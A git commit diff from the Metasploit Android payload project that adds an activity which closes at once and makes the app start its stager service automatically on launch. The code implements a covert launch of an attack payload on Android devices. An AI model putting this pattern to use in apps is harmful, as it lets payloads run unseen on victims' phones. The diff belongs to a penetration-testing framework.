126f7015e3271c21e85265b2b17f381cd842f1ca
AnwarMohamed <anwarelmakrahy@gmail.com>
2013-08-16 17:43:27 +0200

    launch MainService from MyApp

---
+++ androidpayload/app/src/com/metasploit/stage/MainActivity.java
@@ -0,0 +1,13 @@
+package com.metasploit.stage;
+
+import android.app.Activity;
+import android.os.Bundle;
+
+public class MainActivity extends Activity {
+	@Override
+	public void onCreate(Bundle savedInstanceState)
+	{
+		super.onCreate(savedInstanceState);
+		finish();
+	}
+}
--- androidpayload/app/src/com/metasploit/stage/MyApp.java
+++ androidpayload/app/src/com/metasploit/stage/MyApp.java
@@ -2,17 +2,13 @@ package com.metasploit.stage;
 
 import android.app.Application;
 import android.content.Context;
+import android.content.Intent;
 
 public class MyApp extends Application {
-    private static Context mAppContext;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        mAppContext = getApplicationContext();
-    }
-
-    public static Context getContext(){
-        return mAppContext;
+        startService(new Intent(getApplicationContext(), StageService.class));
     }
 }
